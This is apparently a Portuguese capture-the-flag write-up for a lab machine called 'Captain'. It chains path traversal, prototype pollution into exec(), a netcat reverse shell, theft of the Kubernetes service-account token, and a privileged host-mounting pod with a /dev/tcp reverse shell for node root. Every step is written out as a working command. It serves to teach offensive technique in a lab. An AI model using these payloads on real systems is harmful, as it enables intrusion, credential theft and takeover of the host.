# Captain

![Captain](/images/hackingclub-captain/file-captain-2026-1.png)

## Sumário

A exploração iniciou-se com uma vulnerabilidade de `path traversal`, que permitiu a leitura do arquivo `app.js`. A análise do código revelou uma falha de `Prototype Pollution` via` __proto__`, combinada com o uso inseguro da função `exec()`, possibilitando a execução remota de comandos e a obtenção de uma shell.

Em seguida, foi identificado que o acesso ocorria dentro de um container em um `cluster Kubernetes`. A enumeração do ambiente permitiu extrair o `IP`, `porta`, `namespace`, `certificado` e `token de acesso`. Com as permissões obtidas, foi possível `criar um container malicioso`, realizar o escape do container e obter acesso `root` ao host.

## Enumeração inicial do alvo

Utilizamos o nmap para fazer a varredura de quais portas estão abertas no host.

```bash
nmap -sC -sV -Pn captain.hc
```

**Resultado**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
```

## Exploração da aplicação web

Após a análise do código-fonte da aplicação, identificamos uma rota de interesse responsável pelo download de arquivos em PDF, acessível via `/api/download?file=folder.pdf`.

![Code-Review](/images/hackingclub-captain/file-captain-2026-2.png)

## Path Traversal

Após a interceptação da rota de download no Burp Suite, foi possível explorar a vulnerabilidade por meio da utilização de uma payload conhecida de `path traversal`, permitindo a leitura arbitrária de arquivos.

**Payload**

```bash
../../../../etc/passwd
```

![Path Traversal](/images/hackingclub-captain/file-captain-2026-3.png)

### Code-Review

A partir da vulnerabilidade de file read e considerando que a aplicação utiliza `Node.js (Express)`, realizamos a leitura do arquivo `app.js` para analisar o código-fonte e identificar uma vulnerabilidade que possibilitasse o acesso ao host.

**APP.JS**

```bash
const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const bookings = [];

function isObject(obj) {
    return typeof obj === 'object' && obj !== null;
}

function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

function clone(obj) {
    return merge({}, obj);
}

class Booking {
    constructor(data) {
        this.name = data.name || 'Guest';
        this.email = data.email || '';
        this.date = data.date || '';
        this.passengers = data.passengers || 1;
        this.tour = data.tour || 'standard';
        this.id = Date.now();
    }

    confirm() {
        if (this.sendEmail) {
            exec(this.sendEmail);
        }
        return {
            id: this.id,
            name: this.name,
            email: this.email,
            date: this.date,
            passengers: this.passengers,
            tour: this.tour,
            status: 'confirmed'
        };
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.get('/api/download', (req, res) => {
    const file = req.query.file;
    if (!file) {
        res.status(400).send('File parameter is required');
        return;
    }
    const absolute = path.resolve('downloads/' + file);
    res.download(absolute);
});


app.get('/api/tours', (req, res) => {
    res.json([
        { id: 1, name: 'Treasure Hunt Adventure', price: 89, duration: '2 hours', description: 'Search for hidden treasure across the seven seas!' },
        { id: 2, name: 'Sunset Pirate Cruise', price: 129, duration: '3 hours', description: 'Watch the sunset while sailing like a true buccaneer!' },
        { id: 3, name: 'Full Day Pirate Experience', price: 249, duration: '8 hours', description: 'Complete pirate adventure with lunch and activities!' }
    ]);
});

app.post('/api/book', (req, res) => {
    try {
        let bookingData = clone(req.body);
        let booking = new Booking(bookingData);
        let confirmation = booking.confirm();
        bookings.push(confirmation);
        res.json({ success: true, booking: confirmation });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Booking failed' });
    }
});

app.get('/api/bookings', (req, res) => {
    res.json(bookings);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Captain Jack's Pirate Tours running on port ${PORT}`);
});
```

> ❌ A aplicação utiliza exec(this.sendEmail) na linha 46 sem validação da origem da propriedade. Como o código é vulnerável a Prototype Pollution, foi possível injetar a propriedade sendEmail via __proto__, fazendo com que a função confirm() executasse comandos arbitrários no sistema operacional, resultando em Remote Command Execution (RCE).
{: .prompt-danger}

![app.js](/images/hackingclub-captain/file-captain-2026-4.png)

## Obtendo acesso ao host

Devido à vulnerabilidade de `Prototype Pollution`, foi possível injetar propriedades arbitrárias no protótipo global dos objetos `(Object.prototype)`. A partir disso, utilizando a payload apresentada abaixo, conseguimos explorar o endpoint vulnerável e obter uma `reverse shell` no servidor.

```bash
curl -X POST http://captain.hc/api/book \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "sendEmail": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.73.93 9999 > /tmp/f"
    }
  }'
```

![Reverse Shell](/images/hackingclub-captain/file-captain-2026-5.png)

## Cluster do Kubernetes

Após obtermos acesso ao servidor, nos deparamos com uma shell com comportamento atípico. Ao analisarmos o ambiente com mais atenção, identificamos que estávamos executando dentro de um container pertencente a um `cluster Kubernetes`.

![Cluster Kubernetes](/images/hackingclub-captain/file-captain-2026-6.png)

> ℹ️ A presença do diretório /var/run/secrets/kubernetes.io/serviceaccount e o padrão do hostname (captain-deployment-748769bfb4-hrf4c) confirmam que a aplicação estava sendo executada dentro de um Pod em um cluster Kubernetes.
{: .prompt-info}

## Permissões do Kubernetes

Para realizar requisições à `API` do cluster Kubernetes, é necessário obter o `token de autenticação`, as informações de `IP` e `porta` do servidor da API, o `namespace` em uso e o `certificado` de confiança. Com esses dados, é possível interagir com a API e verificar se possuímos permissões, como por exemplo a capacidade de criar novos pods no cluster.

1 - Token de autenticação.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

2 - IP e porta da API do Kubernetes

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
```

3 - Namespace

```bash
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

4 - Certificado da API do cluster

```bash
CRT=$(/var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
```

![Kubernetes](/images/hackingclub-captain/file-captain-2026-7.png)

Com as informações obtidas, salvamos os dados em variáveis de ambiente e realizamos requisições para a API do cluster Kubernetes a fim de verificar nossas permissões. Através da API `SelfSubjectAccessReview`, foi possível confirmar que o service account possuía permissão para criar pods, uma vez que a resposta da API retornou `"allowed": true`, conforme indicado no campo `status`.

1 - Requisição usada para verificar permissão de criar Pods

```bash
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{
    "kind": "SelfSubjectAccessReview",
    "apiVersion": "authorization.k8s.io/v1",
    "spec": {
      "resourceAttributes": {
        "namespace": "default",
        "verb": "create",
        "resource": "pods"
      }
    }
  }'
```

2 - Reposta da API do Kubernetes

```bash
"status": {
  "allowed": true,
  "reason": "RBAC: allowed by RoleBinding \"role-binding/default\" of Role \"pod-role\" to ServiceAccount \"captain-sa/default\""
}
```
![Permission](/images/hackingclub-captain/file-captain-2026-8.png)

## Escape de nó

Como possuíamos permissão para criar pods no cluster, exploramos esse privilégio para realizar o `node escape`. Para isso, criamos um Pod malicioso com `securityContext.privileged: true`, montando o filesystem do host `(hostPath: /)` e utilizando os namespaces do nó `(hostNetwork, hostPID e hostIPC)`. Esse Pod executou uma reverse shell, nos concedendo acesso `root` diretamente ao nó do cluster.

```bash
curl --cacert $CRT -k -X POST $APISERVER/api/v1/namespaces/$NAMESPACE/pods \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "root-pod"
  },
  "spec": {
    "hostNetwork": true,
    "hostPID": true,
    "hostIPC": true,
    "containers": [
      {
        "name": "privesc",
        "image": "ubuntu:latest",
        "securityContext": {
          "privileged": true
        },
        "volumeMounts": [
          {
            "name": "host",
            "mountPath": "/"
          }
        ],
        "command": ["/bin/bash"],
        "args": ["-c", "bash -i >& /dev/tcp/10.0.73.93/4444 0>&1"]
      }
    ],
    "volumes": [
      {
        "name": "host",
        "hostPath": {
          "path": "/",
          "type": "Directory"
        }
      }
    ]
  }
}'
```

![Root](/images/hackingclub-captain/file-captain-2026-9.png)

> ⚠️ Lembre-se de iniciar uma escuta com o Netcat para receber a reverse shell e obter acesso root ao host.
{: .prompt-warning}